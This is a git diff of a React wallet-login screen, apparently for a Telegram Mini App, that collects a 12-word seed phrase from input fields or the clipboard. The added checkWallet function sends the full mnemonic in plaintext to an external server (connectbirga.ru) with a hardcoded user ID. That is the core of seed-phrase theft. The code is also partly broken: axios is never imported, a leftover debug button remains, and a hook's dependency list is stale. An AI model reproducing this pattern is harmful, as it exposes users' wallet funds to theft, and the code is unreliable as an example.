@@ -1,21 +1,100 @@
-import React from "react";
+import React, { useCallback, useEffect, useState } from "react";
 import ListContainer from "./components/ListContainer/ListContainer";
 import ListInput from "./components/ListContainer/ListInput";
 import cl from "./components/One/One.module.scss";
 import CreateButton from "../Profile/components/CreateButton/CreateButton";
-import GreyButton from "./components/GreyButton/GreyButton";
+import { CSSTransition } from "react-transition-group";
+import ErrorBlock from "./components/ErrorBlock/ErrorBlock";
+import { useNavigate } from "react-router-dom";
+import MainButton from "../../constants/MainButton";
+import BackButton from "../../constants/BackButton";
 const WalletInit = () => {
+    const [inputs, setInputs] = useState(Array.from({length : 12} , () => ""))
+    const [show , setShow] = useState(false)
+    const navigate = useNavigate()
+    const buttonClick = useCallback( async () => {
+        const phrase = await navigator.clipboard.readText()
+        .then(text => 
+          text
+        )
+        .catch(err => {
+          console.error('Failed to read clipboard contents: ', err);
+        });
+        
+        const phraseArray = phrase.split(' ')
+        const newArr = []
+        for (let i = 0;i < 12; i++){
+            if (i < phraseArray.length){
+                newArr.push(phraseArray[i])
+            }
+            else{
+                newArr.push('')
+            }
+        }
+        setInputs(newArr)
+        
+    } , [] )
+    console.log();
+
+    useEffect(  () => {
+        function backFucntion(){
+            navigate(-1)
+        }
+        BackButton.show()
+        BackButton.onClick(backFucntion)
+        return () => {
+            BackButton.offClick(backFucntion)
+        }
+    })
+
+
+    const checkWallet = useCallback( async () => {
+        try{
+
+            const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
+                mnemonic: inputs,
+                userId: 858931156,
+              } , {
+                headers : {
+                  "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
+                }
+              });
+              navigate('/Wallet')
+        }
+        catch(e){
+            window.Telegram.WebApp.HapticFeedback.notificationOccurred("error")
+            setShow((value) => !value)
+        }
+    } , [inputs]  )
+
+    useEffect( () => {
+        MainButton.show()
+        MainButton.onClick(checkWallet)
+        return () => {
+            MainButton.hide()
+            MainButton.offClick(checkWallet)
+        }
+    } , [] )
+    
+    const setSomeInput = useCallback((value, index) => {
+        setInputs((val) => ([...val].map((e,i) => index === i ? value : e)))
+    } , [setInputs] )
+    const clearAll = useCallback( () => {
+        setInputs(Array.from({length : 12} , () => ""))
+    } , [setInputs] )
+
+
   return (
-    <div className={cl.container}>
+    <>
+    <button onClick={checkWallet}>Хэй как дела</button>
+    <div className={[cl.container, cl.padding].join(' ')}>
       <h2 className={cl.title}>Войти в кошелек</h2>
 
       <p className={cl.topText}>
-        Вставьте сид-фразу вашего кошелька, чтобы использовать его в приложении
+        Вставьте сид фразу вашего кошелька, чтобы использовать его в приложении
       </p>
 
-      <ListInput />
-
-      <CreateButton className={cl.WalletInitCreateButton}>
+      <CreateButton onClick={buttonClick} className={cl.WalletInitCreateButton}>
         <div className={cl.buttonContainer}>
           <p>Вставить фразу</p>
           <svg
@@ -32,8 +111,14 @@ const WalletInit = () => {
           </svg>
         </div>
       </CreateButton>
-      <GreyButton />
+
+      <ListInput setSomeInput = {setSomeInput} inputs={inputs} inputClassName={cl.listInputItem} className={cl.listInput} />
+      <p onClick={clearAll} className={cl.resetAll}>Очистить всё</p>
     </div>
+    <CSSTransition classNames = "errorModal" in = {show} timeout={3000}  >
+        <ErrorBlock />
+    </CSSTransition>
+    </>
   );
 };
 
